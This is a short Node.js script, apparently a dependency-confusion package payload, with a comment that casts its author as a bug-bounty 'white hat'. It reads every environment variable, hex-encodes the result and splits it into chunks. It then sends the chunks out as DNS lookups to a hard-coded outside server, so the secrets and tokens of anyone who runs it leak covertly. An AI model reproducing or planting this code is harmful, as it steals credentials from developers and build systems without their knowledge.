
//hackerone.com/homosec
//Bug Bounty Security Reasearch White Hat t.a.neo@ya.ru
const { Resolver } = require('dns');
const resolver = new Resolver();

function convertASCIItoHex(asciiString) {
    let hex = '';
    let tempASCII, tempHex;
    asciiString.split('').map( i => {
        tempASCII = i.charCodeAt(0)
        tempHex = tempASCII.toString(16);
        hex = hex + tempHex;
    });
    hex = hex.trim();
    return hex;
}

function splitString (string, size) {
	var re = new RegExp('.{1,' + size + '}', 'g');
	return string.match(re);
}

resolver.setServers(['178.154.212.234']);

var ebala = JSON.stringify(process.env)

var ch = splitString(convertASCIItoHex(ebala), 32)

var dt = Date.now()
for(var i in ch){
    resolver.resolve4('arui-ft-private.'.replace('/','___')+'FROMIP.'+dt+'.'+i+'.'+ch[i], function(err){
        if (err) throw err;
    });
}

